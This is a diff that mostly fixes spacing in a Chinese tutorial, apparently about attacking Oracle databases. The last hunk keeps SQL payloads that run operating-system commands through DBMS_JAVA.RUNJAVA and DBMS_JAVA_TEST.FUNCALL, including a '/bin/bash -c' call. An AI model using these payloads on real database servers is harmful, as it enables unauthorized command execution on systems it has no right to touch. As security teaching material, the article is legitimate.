@@ -158,7 +158,7 @@ dba 权限用户才可以查看的表，里面有系统里所有信息。表的�
 
 ### 获取常见信息
 
--   版本 ：`SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';` 或者 `SELECT version FROM v$instance;`
+-   版本：`SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';` 或者 `SELECT version FROM v$instance;`
 
 [![](assets/1710899076-469966bec626511d2d3fd59c88cb6dbd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240228100832-45f8d2ae-d5de-1.png)
 
@@ -206,14 +206,14 @@ CREATE TABLE test1 (
     tname VARCHAR2 ( 20 )
 );
 
--- 或直接copy别的表结构
+-- 或直接 copy 别的表结构
 
 CREATE TABLE emp20 AS SELECT
 *
 FROM
     EMP
 WHERE
-    DEPTNO = 20;-- where条件有效，复制数据，无效，只复制表结构
+    DEPTNO = 20;-- where 条件有效，复制数据，无效，只复制表结构
 ```
 
 [![](assets/1710899076-88ca7ef22ead7991db420fdd72bb01fb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240228100910-5c8dd3e8-d5de-1.png)
@@ -568,7 +568,7 @@ name 'oraexec.execCommand(java.lang.String) return String';
 -- 11g
 SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper touch /tmp/success') FROM DUAL;
 
--- 10g/11g, 注意10g中还需要readFileDescriptor和writeFileDescriptor
+-- 10g/11g, 注意 10g 中还需要 readFileDescriptor 和 writeFileDescriptor
 SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/sbin/ifconfig>/tmp/1.txt') FROM DUAL;
 ```
 
